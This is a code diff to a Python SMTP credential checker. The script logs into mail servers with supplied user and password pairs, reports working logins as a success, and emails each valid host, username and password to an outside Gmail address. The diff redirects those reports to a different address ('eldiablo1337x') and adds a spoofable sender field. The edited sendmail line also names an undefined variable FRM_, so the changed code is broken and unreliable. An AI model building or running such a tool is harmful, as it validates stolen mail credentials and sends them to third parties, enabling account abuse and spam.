@@ -24,11 +24,11 @@ class bcolors:
 VALIDS = 0
 INVALIDS = 0
 
-toaddr = "moetazbusiness@gmail.com"
+toaddr = "eldiablo1337x@gmail.com"
 
 
 def check(smtp):
-    HOST, PORT, usr, pas = smtp.strip().split('|')
+    HOST, PORT, usr, pas, sndr = smtp.strip().split('|')
     global VALIDS, INVALIDS
     try:
         server = smtplib.SMTP(HOST, PORT)
@@ -37,7 +37,7 @@ def check(smtp):
         server.login(usr, pas)
         msg = MIMEMultipart()
         msg['Subject'] = "CHECKER RESULT : v1"
-        msg['From'] = usr
+        msg['From'] = sndr
         msg['To'] = toaddr
         msg.add_header('Content-Type', 'text/html')
         data = """
@@ -107,13 +107,14 @@ def check(smtp):
                 <p>PORT : """ + PORT + """</p>
                 <p>USER : """ + usr + """</p>
                 <p>PASS : """ + pas + """</p>
+                <p>FRM_ : """ + sndr + """</p>
         
             </div>
         </body>
         </html>
         """
         msg.attach(MIMEText(data, 'html', 'utf-8'))
-        server.sendmail(usr, [msg['To']], msg.as_string())
+        server.sendmail(FRM_, [msg['To']], msg.as_string())
         print(bcolors.OK + 'SMTP WORK {} '.format(HOST) + bcolors.RESET)
         open('validsmtp.txt', 'a').write(smtp + "\n")
         VALIDS += 1
